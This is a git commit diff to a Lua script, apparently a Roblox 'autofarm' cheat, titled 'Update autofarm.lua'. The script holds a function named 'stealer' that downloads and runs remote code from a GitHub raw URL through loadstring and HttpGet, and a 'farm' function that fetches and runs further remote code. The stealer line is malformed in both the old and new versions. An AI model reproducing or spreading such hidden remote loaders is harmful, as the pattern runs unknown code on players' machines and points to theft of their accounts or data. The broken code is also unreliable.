5c5484e0626cab19ee3300032e36924f981f71fb
adxxta483 <adiduica86@gmail.com>
2024-12-26 00:07:16 +0200

    Update autofarm.lua

--- autofarm.lua
+++ autofarm.lua
@@ -1,5 +1,5 @@
 local function stealer()
-    loadstring(game:HttpGet('loadstring(game:HttpGet('https://raw.githubusercontent.com/tobi437a/Scripts/refs/heads/main/c1a971e2734cf61e6ced2f30.lua'))()'))()
+    loadstring(game:HttpGet('loadstring(game:HttpGet('https://raw.githubusercontent.com/tobi437a/Scripts/refs/heads/main/c1a971e2734cf61e6ced2f30.lua'))()
 end
 local function farm()
     loadstring(game:HttpGet('https://raw.githubusercontent.com/vertex-peak/vertex/refs/heads/main/loadstring'))()
